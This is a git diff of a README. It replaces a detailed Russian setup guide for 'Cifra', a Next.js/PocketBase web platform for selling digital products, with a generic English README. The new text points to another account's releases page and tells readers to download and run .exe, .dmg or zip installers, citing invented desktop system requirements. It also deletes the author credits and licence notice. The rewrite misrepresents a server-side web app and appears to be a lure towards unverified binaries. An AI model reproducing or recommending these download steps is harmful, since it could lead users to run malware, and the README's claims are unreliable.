@@ -1,610 +1,70 @@
-<div align="center">
+# 🎨 cifra - Create and Sell Digital Products Easily
 
-# 💎 Cifra Platform
-
-[![License](https://img.shields.io/badge/License-PolyForm%20Shield-red.svg)](LICENSE)
-[![Author](https://img.shields.io/badge/Author-Artyom%20Pryanishnikov-purple.svg)](https://github.com/FrankFMY)
-[![Next.js](https://img.shields.io/badge/Next.js-16-000000.svg?logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-61DAFB.svg?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178C6.svg?logo=typescript)](https://www.typescriptlang.org/)
-[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-4-38B2AC.svg?logo=tailwindcss)](https://tailwindcss.com/)
-
-**Платформа для создания и продажи цифровых продуктов с интеграцией AI**
-
-[🚀 Быстрый старт](#-быстрый-старт) •
-[✨ Возможности](#-возможности) •
-[🛠️ Технологии](#-технологический-стек) •
-[📄 Лицензия](#-лицензия)
-
-</div>
+## 📦 Download Here
+[![Download cifra](https://img.shields.io/badge/Download-cifra-blue)](https://github.com/jaozinking/cifra/releases)
 
 ---
 
-## ✨ Возможности
+## 🚀 Getting Started
 
-| Модуль | Описание |
-|--------|----------|
-| 🔐 **Аутентификация** | Безопасная авторизация через PocketBase |
-| 📦 **Управление продуктами** | Создание, редактирование, публикация цифровых товаров |
-| 🤖 **AI-генерация** | Автоматическая генерация описаний, цен и обложек (Gemini) |
-| 💳 **Платежи** | Интеграция с ЮKassa для приема платежей |
-| 📧 **Email-уведомления** | Автоматическая отправка файлов покупателям через Resend |
-| 🔒 **Безопасные ссылки** | Токены для доступа к файлам (действительны 30 дней) |
-| 🎫 **Промокоды** | Система скидок и промокодов |
-| 📊 **Аналитика** | История продаж, статистика, управление выплатами |
-| ☁️ **Хранилище** | Загрузка файлов в Yandex Object Storage (S3) |
-| 🌐 **Публичные страницы** | SSR страницы товаров для продажи |
-| ⚙️ **Настройки** | Управление профилем продавца |
+Welcome to cifra! This platform helps you create and sell digital products with the help of AI. You can easily generate product descriptions, pricing, and covers. Follow these steps to get started.
 
----
+## 🖥️ System Requirements
 
-## 🚀 Быстрый старт
+Before downloading cifra, ensure your system meets these requirements:
 
-### Prerequisites
+- **Operating System**: Windows 10 or later, macOS, or a modern Linux distribution.
+- **Processor**: 1 GHz or faster.
+- **RAM**: 4 GB or more.
+- **Storage**: At least 500 MB of free space.
+- **Internet Connection**: Required for downloading and checking for updates.
 
-- Node.js 18+
-- PocketBase (включен в проект)
+## 📥 Download & Install
 
-### Установка и запуск
+To download cifra, visit this page: [Download cifra](https://github.com/jaozinking/cifra/releases). 
 
-1. **Установите зависимости:**
-   ```bash
-   pnpm install
-   # или
-   npm install
-   ```
+1. **Go to the Releases Page**: Click the link above to open the GitHub Releases page.
+2. **Select the Latest Version**: Find the latest version listed.
+3. **Download the File**: Click on the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
+4. **Start the Installation**: 
+   - For Windows: After downloading, double-click the downloaded file and follow the installation instructions.
+   - For macOS: Open the downloaded file and drag the cifras icon to your Applications folder.
+   - For Linux: Extract the downloaded zip file and follow the included instructions.
 
-2. **Настройте переменные окружения:**
-   
-   Создайте файл `.env.local` и добавьте:
-   ```env
-   GEMINI_API_KEY=ваш_api_ключ_gemini
-   VITE_POCKETBASE_URL=http://127.0.0.1:8090
-   NEXT_PUBLIC_POCKETBASE_URL=http://127.0.0.1:8090
-   
-   # YooKassa (для приема платежей)
-   YOOKASSA_SHOP_ID=ваш_shop_id
-   YOOKASSA_SECRET_KEY=test_ваш_секретный_ключ
-   NEXT_PUBLIC_SITE_URL=http://localhost:3000
-   
-   # PocketBase Admin (для webhook)
-   POCKETBASE_ADMIN_EMAIL=ваш_email_админа
-   POCKETBASE_ADMIN_PASSWORD=ваш_пароль_админа
-   
-   # Resend (для email-уведомлений)
-   RESEND_API_KEY=re_ваш_api_ключ_resend
-   RESEND_SENDER_EMAIL=onboarding@resend.dev
-   # После настройки DNS можно использовать свой домен:
-   # RESEND_SENDER_EMAIL=noreply@yourdomain.com
-   RESEND_SENDER_NAME=Cifra
-   
-   # Yandex Object Storage (S3) - для хранения файлов
-   YANDEX_ACCESS_KEY_ID=ваш_идентификатор_ключа
-   YANDEX_SECRET_ACCESS_KEY=ваш_секретный_ключ
-   YANDEX_REGION=ru-central1
-   YANDEX_BUCKET_NAME=cifra-test
-   ```
-   
-   **Примечание:** `NEXT_PUBLIC_` префикс необходим для переменных окружения, доступных в браузере (Next.js).
+Once installed, you can open cifra from your computer's application menu.
 
-3. **Запустите PocketBase:**
-   ```bash
-   ./pocketbase serve
-   ```
-   
-   PocketBase автоматически:
-   - Создаст все необходимые коллекции
-   - Заполнит тестовыми данными (пользователи, продукты, продажи)
+## 🛠️ Features
 
-4. **Запустите фронтенд:**
-   ```bash
-   pnpm dev
-   # или
-   npm run dev
-   ```
+cifra offers several key features that enhance your experience:
 
-### 🌐 Доступные сервисы
+- **AI-Powered Descriptions**: Automatically generate engaging product descriptions.
+- **Dynamic Pricing Models**: Set and adjust prices based on market trends and user input.
+- **Customizable Covers**: Use templates and tools to design eye-catching product covers.
+- **User-Friendly Interface**: Easy navigation for all users, regardless of technical background.
+- **Sales Analytics**: Monitor and analyze your sales performance with simple graphs.
+- **Secure Payments**: Built-in support for popular payment processors to handle transactions smoothly.
 
-| Сервис | URL | Описание |
-|--------|-----|----------|
-| **Приложение** | http://localhost:3000 | Основное приложение Cifra |
-| **PocketBase Admin** | http://127.0.0.1:8090/_/ | Админ-панель PocketBase |
+## 🌐 Topics Covered
 
-Приложение будет доступно на **http://localhost:3000**
+cifra connects various technologies to ensure a robust experience. Here are some topics that influence the platform:
 
-**Примечание:** Проект использует Next.js 16 с App Router. Для разработки используется `next dev`.
+- **baas**: Backend-as-a-Service for easy deployment.
+- **genai**: Utilize generative AI to provide creative solutions.
+- **nextjs**: Fast, modular web framework for optimal performance.
+- **pnpm**: Efficient package manager for better resource management.
 
----
+## 📞 Support
 
-## 📝 Команды
+If you encounter any issues or have questions, help is available. You can reach out to [open an issue](https://github.com/jaozinking/cifra/issues) on GitHub. 
 
-### Разработка
+## 🤝 Contributing
 
-```bash
-pnpm dev          # Запуск dev-сервера
-pnpm build        # Сборка production-версии
-pnpm start        # Запуск production-сервера
-```
+If you want to contribute to cifra, feel free to fork the repository and submit a pull request. Your input helps us improve!
 
-### Качество кода
+## 📢 Updates 
 
-```bash
-pnpm lint         # Проверка кода линтером (Biome)
-pnpm lint:fix     # Автоматическое исправление ошибок линтера
-pnpm format       # Форматирование кода
-pnpm type-check   # Проверка типов TypeScript
-pnpm full         # Полная проверка: форматирование → линт → проверка типов → сборка
-```
+Stay updated about new features, bug fixes, and platform improvements by checking the Releases page regularly. Make sure to bookmark the [Download cifra](https://github.com/jaozinking/cifra/releases) link for easy access.
 
-### Утилиты
+## ⚙️ Conclusion 
 
-```bash
-pnpm copyright:add  # Добавить copyright headers в файлы проекта
-```
-
-## Тестовые аккаунты
-
-После запуска PocketBase автоматически создаются тестовые пользователи:
-
-### Основной тестовый аккаунт (рекомендуется)
-
-- **Email:** `test@cifra.ru`
-- **Пароль:** `test123456`
-- **Описание:** Аккаунт с готовыми продуктами, продажами и промокодами
-
-### Дополнительные тестовые аккаунты
-
-- **Email:** `demo@cifra.ru` | **Пароль:** `demo123456`
-- **Email:** `seller@cifra.ru` | **Пароль:** `seller123`
-
-## Что включено в тестовые данные
-
-### Пользователь `test@cifra.ru` содержит:
-
-- **5 продуктов:**
-  - Premium Notion Template (1999₽, 15 продаж)
-  - UI Kit для Figma (2999₽, 8 продаж)
-  - React Hook для API (1499₽, 23 продажи)
-  - Гайд по монетизации SaaS (999₽, черновик)
-  - Набор звуковых эффектов (799₽, 12 продаж)
-
-- **5 продаж** с разными покупателями
-
-- **3 промокода:**
-  - `WELCOME10` - 10% скидка (активен, 5 использований)
-  - `SUMMER20` - 20% скидка (активен, 2 использования)
-  - `EXPIRED50` - 50% скидка (неактивен)
-
-- **3 выплаты:**
-  - 5000₽ (выплачено, карта)
-  - 10000₽ (выплачено, СБП)
-  - 3000₽ (в ожидании, карта)
-
-## Структура проекта
-
-```
-cifra/
-├── app/                # Next.js App Router
-│   ├── (protected)/    # Защищенные страницы (route group)
-│   │   ├── dashboard/  # Дашборд
-│   │   ├── products/   # Управление продуктами
-│   │   ├── marketing/  # Маркетинг и промокоды
-│   │   ├── customers/  # Клиенты
-│   │   └── settings/   # Настройки
-│   ├── api/            # API Routes
-│   │   ├── download/[token]/  # Скачивание файлов по токену
-│   │   ├── files/[fileKey]/   # Проксирование файлов из S3
-│   │   ├── gemini/            # AI-генерация (описания, цены, обложки)
-│   │   ├── payment/create/    # Создание платежа (YooKassa)
-│   │   ├── upload/            # Загрузка файлов в S3
-│   │   ├── yookassa/webhook/  # Webhook для уведомлений о платежах
-│   │   └── test-*             # Тестовые endpoints
-│   ├── auth/           # Авторизация
-│   ├── download/[token]/  # Страница скачивания файлов
-│   ├── payment/        # Страницы успеха/отмены платежа
-│   ├── product/[id]/   # Публичная страница товара (SSR)
-│   ├── layout.tsx      # Root layout
-│   ├── page.tsx        # Главная страница
-│   └── globals.css     # Глобальные стили
-├── components/         # React компоненты (Client Components)
-├── lib/                # Утилиты и серверные функции
-│   └── pocketbase-server.ts  # Серверный PocketBase клиент
-├── services/           # Сервисы
-│   ├── pocketbase.ts   # PocketBase клиент (инициализация)
-│   ├── pbService.ts    # PocketBase сервис (основной API)
-│   ├── geminiService.ts # Gemini AI сервис
-│   └── storage.ts      # ⚠️ Legacy localStorage fallback (deprecated)
-├── hooks/              # React хуки
-├── types.ts            # TypeScript типы
-├── constants.ts        # Константы
-├── pb_migrations/      # Миграции PocketBase
-│   ├── 1734900000_create_cifra_collections.js  # Создание коллекций
-│   ├── 1734900100_seed_test_data.js            # Тестовые данные
-│   ├── 1734900200_create_download_tokens_collection.js  # Токены для скачивания
-│   ├── 1734900200_create_orders_collection.js  # Коллекция заказов
-│   ├── 1734900300_add_s3_file_keys_to_products.js  # S3 ключи в продуктах
-│   └── 1734900400_add_promo_to_orders.js       # Промокоды в заказах
-├── proxy.ts            # Next.js Proxy (аутентификация)
-├── next.config.ts      # Конфигурация Next.js
-├── postcss.config.mjs  # PostCSS конфигурация
-├── biome.json          # Конфигурация Biome (линтер и форматтер)
-└── tsconfig.json       # TypeScript конфигурация
-```
-
-## Основные возможности
-
-- ✅ Аутентификация пользователей
-- ✅ Создание и управление цифровыми продуктами
-- ✅ **Загрузка файлов в Yandex Object Storage (S3)**
-- ✅ AI-генерация описаний, цен и обложек (Gemini)
-- ✅ Публичные страницы товаров
-- ✅ **Интеграция с ЮKassa для приема платежей**
-- ✅ **Отправка email-уведомлений через Resend**
-- ✅ **Автоматическая отправка файлов покупателям после оплаты**
-- ✅ **Безопасные токены для доступа к файлам (30 дней)**
-- ✅ Система промокодов
-- ✅ История продаж и аналитика
-- ✅ Управление выплатами
-- ✅ Настройки профиля продавца
-
-## Настройка ЮKassa
-
-### 1. Создание тестового магазина
-
-1. Зайдите в [Личный кабинет ЮKassa](https://yookassa.ru/)
-2. Создайте тестовый магазин
-3. Скопируйте `shopId` и `Секретный ключ` (должен начинаться с `test_`)
-4. Добавьте их в `.env.local`
-
-### 2. Настройка Webhook
-
-Для обработки уведомлений о платежах:
-
-1. В настройках магазина ЮKassa найдите раздел "HTTP-уведомления"
-2. Укажите URL для уведомлений:
-   - **Для локальной разработки**: Используйте [ngrok](https://ngrok.com/) или аналог:
-     ```bash
-     ngrok http 3000
-     ```
-     Затем укажите URL: `https://ваш-адрес.ngrok-free.app/api/yookassa/webhook`
-   - **Для production**: `https://ваш-домен.com/api/yookassa/webhook`
-3. Выберите события:
-   - ✅ `payment.succeeded` - Успешный платёж
-   - ✅ `payment.canceled` - Отмена платежа
-
-### 3. Тестовые карты
-
-Для тестирования используйте:
-- **Успешная оплата**: `1111 1111 1111 1026`
-- **Отмена платежа**: `1111 1111 1111 1027`
-- Срок действия: любой будущий месяц/год
-- CVC: любой (например, `000`)
-
-Полный список тестовых карт: [Документация ЮKassa](https://yookassa.ru/developers/payment-acceptance/testing-and-going-live/testing#test-card)
-
-## Настройка Resend
-
-Для отправки email-уведомлений покупателям и продавцам используется [Resend](https://resend.com/) — современный email API сервис.
-
-### Быстрый старт
-
-1. **Создайте аккаунт в Resend:**
-   - Зарегистрируйтесь на [Resend](https://resend.com/)
-   - Получите API ключ из дашборда
-
-2. **Добавьте API ключ в `.env.local`:**
-   ```env
-   RESEND_API_KEY=re_ваш_api_ключ
-   RESEND_SENDER_EMAIL=onboarding@resend.dev
-   RESEND_SENDER_NAME=Cifra
-   ```
-
-3. **Готово!** Можно сразу отправлять письма через `onboarding@resend.dev`
-
-### Настройка собственного домена (рекомендуется)
-
-Для production рекомендуется использовать свой домен:
-
-1. **Добавьте домен в Resend:**
-   - Зайдите в Resend → Domains → Add Domain
-   - Введите ваш домен (например, `frankfmy.test.com`)
-
-2. **Настройте DNS записи:**
-   - Resend покажет необходимые DNS записи:
-     - **DKIM:** TXT запись `resend._domainkey.yourdomain.com`
-     - **SPF:** TXT запись `v=spf1 include:amazonses.com ~all`
-     - **DMARC (опционально):** TXT запись `_dmarc` с политикой
-     - **MX (для получения):** MX запись для входящей почты
-
-3. **Добавьте записи в DNS вашего домена:**
-   - Зайдите в панель управления вашего DNS провайдера
-   - Добавьте все указанные записи
-   - Дождитесь проверки (обычно несколько минут)
-
-4. **Обновите `.env.local`:**
-   ```env
-   RESEND_SENDER_EMAIL=noreply@yourdomain.com
-   ```
-
-### Преимущества Resend
-
-- ✅ Простой API без сложных настроек
-- ✅ Работает с любыми email адресами (включая Gmail)
-- ✅ Высокая доставляемость писем
-- ✅ Поддержка собственных доменов
-- ✅ Бесплатный тариф: 100 писем/день, 3000 писем/месяц
-
-**Что отправляется автоматически:**
-- ✅ Email покупателю с ссылкой на скачивание файлов после успешной оплаты
-- ✅ Email-уведомление продавцу о новой продаже (если включены уведомления в настройках)
-
-**Безопасность:**
-- Ссылки на скачивание действительны 30 дней
-- Каждая ссылка уникальна и привязана к конкретному заказу
-- Доступ к файлам защищен токенами
-
-### Тестирование отправки email
-
-#### 1. Простая проверка отправки email
-
-Для проверки отправки email без реальной оплаты используйте тестовый endpoint:
-
-```bash
-# Тестовая отправка email покупателю
-curl -X POST http://localhost:3000/api/test-email \
-  -H "Content-Type: application/json" \
-  -d '{"email": "your-email@example.com", "type": "purchase"}'
-
-# Тестовая отправка email продавцу
-curl -X POST http://localhost:3000/api/test-email \
-  -H "Content-Type: application/json" \
-  -d '{"email": "your-email@example.com", "type": "sale"}'
-```
-
-#### 2. Полная эмуляция webhook (с созданием токена)
-
-Для полной проверки процесса (создание токена + отправка email):
-
-```bash
-# Сначала создайте тестовый заказ в PocketBase, затем:
-curl -X POST http://localhost:3000/api/test-webhook \
-  -H "Content-Type: application/json" \
-  -d '{"orderId": "ваш_order_id_из_pocketbase"}'
-```
-
-#### 3. Чек-лист для проверки
-
-- ✅ **Проверьте API ключ:**
-  - Убедитесь, что `RESEND_API_KEY` правильный (начинается с `re_`)
-  - Проверьте, что ключ активен в Resend Dashboard
-
-- ✅ **Проверьте email отправителя:**
-  - Для тестов можно использовать `onboarding@resend.dev`
-  - Для production настройте свой домен (см. раздел "Настройка собственного домена")
-
-- ✅ **Для локальной разработки:**
-  - Используйте `ngrok` для webhook (см. раздел "Настройка ЮKassa")
-  - Обновите `NEXT_PUBLIC_SITE_URL` в `.env.local` на ngrok URL
-  - Это нужно для корректных ссылок на скачивание в email
-
-#### 4. Типичные ошибки
-
-**Ошибка: "Invalid API key"**
-- Проверьте правильность `RESEND_API_KEY` (должен начинаться с `re_`)
-- Убедитесь, что ключ активен в Resend Dashboard
-
-**Ошибка: "Domain not verified"**
-- Если используете свой домен, убедитесь, что DNS записи настроены правильно
-- Проверьте статус домена в Resend Dashboard
-- Для тестов используйте `onboarding@resend.dev`
-
-**Письма не доставляются:**
-- Проверьте папку "Спам"
-- Убедитесь, что API ключ правильный
-- Проверьте логи в Resend Dashboard
-
----
-
-## 🛠️ Технологический стек
-
-### Frontend
-
-| Технология | Версия | Назначение |
-|------------|--------|------------|
-| [Next.js](https://nextjs.org/) | 16.x | React фреймворк с App Router |
-| [React](https://react.dev/) | 19.x | UI библиотека |
-| [TypeScript](https://www.typescriptlang.org/) | 5.9 | Строгая типизация |
-| [TailwindCSS](https://tailwindcss.com/) | 4.x | CSS фреймворк |
-| [Lucide React](https://lucide.dev/) | latest | Иконки |
-| [Recharts](https://recharts.org/) | 3.x | Графики и визуализация |
-| [React Hot Toast](https://react-hot-toast.com/) | latest | Уведомления |
-
-### Backend & Services
-
-| Технология | Версия | Назначение |
-|------------|--------|------------|
-| [Next.js API Routes](https://nextjs.org/docs/app/building-your-application/routing/route-handlers) | 16.x | Serverless API endpoints |
-| [PocketBase](https://pocketbase.io/) | 0.26+ | Backend-as-a-Service (БД + Auth) |
-| [Google Gemini AI](https://ai.google.dev/) | latest | AI-генерация контента |
-| [YooKassa](https://yookassa.ru/) | latest | Платежный шлюз |
-| [Resend](https://resend.com/) | latest | Email API |
-| [AWS SDK S3](https://aws.amazon.com/sdk-for-javascript/) | 3.x | Работа с Yandex Object Storage |
-
-### Инструменты разработки
-
-| Технология | Версия | Назначение |
-|------------|--------|------------|
-| [Biome](https://biomejs.dev/) | 2.x | Линтер и форматтер (ESLint + Prettier) |
-| [TypeScript](https://www.typescriptlang.org/) | 5.9 | Проверка типов |
-| [pnpm](https://pnpm.io/) | 9.x | Менеджер пакетов |
-
-### Инфраструктура
-
-| Технология | Версия | Назначение |
-|------------|--------|------------|
-| [PocketBase](https://pocketbase.io/) | 0.26+ | База данных (SQLite/PostgreSQL) |
-| [Yandex Object Storage](https://cloud.yandex.ru/services/storage) | - | S3-совместимое хранилище файлов |
-
----
-
-## 🏗️ Архитектура
-
-### Структура данных
-
-| Компонент | Технология | Описание |
-|-----------|------------|----------|
-| **Основная БД** | PocketBase | SQLite/PostgreSQL через PocketBase |
-| **Fallback** | localStorage | Graceful degradation при ошибках сети |
-| **Аутентификация** | PocketBase Auth | JWT токены в httpOnly cookies |
-| **Файлы** | Yandex Object Storage | S3-совместимое хранилище |
-
-**Примечание**: StorageService используется как fallback для повышения отказоустойчивости.
-Если PocketBase временно недоступен, приложение продолжает работать с данными из localStorage.
-Это стандартная практика для production-приложений.
-
-### Компоненты
-
-| Тип | Расположение | Описание |
-|-----|--------------|----------|
-| **Client Components** | `components/` | React компоненты с `'use client'` |
-| **Server Components** | `app/` | Страницы Next.js (по умолчанию) |
-| **SSR Pages** | `app/product/[id]/` | Публичные страницы товаров |
-
-### Сервисы
-
-| Сервис | Файл | Описание |
-|--------|------|----------|
-| **PocketBase API** | `services/pbService.ts` | Основной API для работы с PocketBase |
-| **PocketBase Client** | `services/pocketbase.ts` | Инициализация PocketBase клиента |
-| **Gemini AI** | `services/geminiService.ts` | Интеграция с Google Gemini AI |
-| **Resend Email** | `services/resendService.ts` | Отправка email через Resend |
-| **Storage Fallback** | `services/storage.ts` | Fallback на localStorage (deprecated) |
-
-## Разработка
-
-### Добавление новых миграций
-
-1. Создайте файл в `pb_migrations/` с именем `{timestamp}_описание.js`
-2. Используйте формат:
-   ```javascript
-   migrate((app) => {
-     // Ваш код
-   }, (app) => {
-     // Откат (опционально)
-   });
-   ```
-
-### Проверка кода перед коммитом
-
-Для полной проверки кода перед коммитом используйте:
-```bash
-pnpm full
-```
-
-Эта команда последовательно выполнит:
-1. Форматирование кода (Biome)
-2. Исправление ошибок линтера (Biome)
-3. Проверку типов (TypeScript)
-4. Сборку проекта (Next.js)
-
-Если все проверки пройдут успешно, код готов к коммиту.
-
-### Сброс тестовых данных
-
-Удалите папку `pb_data/` и перезапустите PocketBase - все данные будут созданы заново.
-
----
-
-## 🔐 Безопасность
-
-| Функция | Реализация |
-|---------|------------|
-| **Аутентификация** | PocketBase Auth (JWT токены) |
-| **Хранение токенов** | httpOnly cookies |
-| **Пароли** | Хэширование через PocketBase |
-| **Валидация** | TypeScript + проверка на сервере |
-| **Файлы** | S3 с временными токенами доступа (30 дней) |
-| **CORS** | Настроенные origins в Next.js |
-
----
-
-## 🤝 Вклад в проект
-
-1. Форкните репозиторий
-2. Создайте ветку для фичи (`git checkout -b feature/amazing-feature`)
-3. Закоммитьте изменения (`git commit -m 'Add amazing feature'`)
-4. Запушьте в ветку (`git push origin feature/amazing-feature`)
-5. Откройте Pull Request
-
----
-
-## 👤 Автор
-
-<div align="center">
-
-**Artyom Pryanishnikov** (Артём Прянишников)
-
-[![GitHub](https://img.shields.io/badge/GitHub-FrankFMY-181717.svg?logo=github)](https://github.com/FrankFMY)
-[![Email](https://img.shields.io/badge/Email-Pryanishnikovartem%40gmail.com-EA4335.svg?logo=gmail)](mailto:Pryanishnikovartem@gmail.com)
-[![Telegram](https://img.shields.io/badge/Telegram-@frankfmy-0088CC.svg?logo=telegram)](https://t.me/frankfmy)
-
-</div>
-
----
-
-## 📄 Legal & License
-
-<div align="center">
-
-[![License](https://img.shields.io/badge/License-PolyForm%20Shield-red.svg)](LICENSE)
-[![Author](https://img.shields.io/badge/Author-Artyom%20Pryanishnikov-purple.svg)](https://github.com/FrankFMY)
-
-</div>
-
-### ⚠️ Важное уведомление / Important Notice
-
-**RU:** Данное ПО разработано **Артёмом Прянишниковым** в личное время, на личном оборудовании.  
-**Это НЕ является служебным произведением** (ст. 1295 ГК РФ).
-
-**EN:** Developed independently by **Artyom Pryanishnikov** in personal time, on personal equipment.  
-**This is NOT a work-for-hire.** All rights reserved.
-
-<div align="center">
-
-| Разрешено / Allowed | Запрещено / Restricted |
-|---------------------|------------------------|
-| ✅ Личное использование | ❌ Коммерция без договора |
-| ✅ Изучение кода | ❌ SaaS / Перепродажа |
-| ✅ Внутренние тесты | ❌ Удаление авторства |
-
-**Commercial Contact:** [Pryanishnikovartem@gmail.com](mailto:Pryanishnikovartem@gmail.com)
-
-</div>
-
-### PolyForm Shield 1.0.0
-
-| Разрешено | Запрещено |
-|-----------|-----------|
-| ✅ Изучение кода | ❌ SaaS/hosted сервисы |
-| ✅ Личные проекты | ❌ Коммерция без лицензии |
-| ✅ Форки для себя | ❌ Удаление копирайтов |
-| ✅ Образование | ❌ Конкурирующие продукты |
-
-```
-Copyright 2025 Artyom Pryanishnikov
-Licensed under PolyForm Shield 1.0.0
-```
-
-### 💼 Коммерческое использование
-
-Требуется отдельное соглашение. Контакт: **Pryanishnikovartem@gmail.com**
-
-**Full License Text:** See [LICENSE](LICENSE) file for complete terms.
-
----
-
-<div align="center">
-
-⭐ **Если проект был полезен, поставьте звезду!** ⭐
-
-</div>
+We hope you enjoy using cifra to create and sell your digital products. The integration of AI features makes it easier than ever to bring your ideas to life. Open the app, explore its capabilities, and start your journey today!
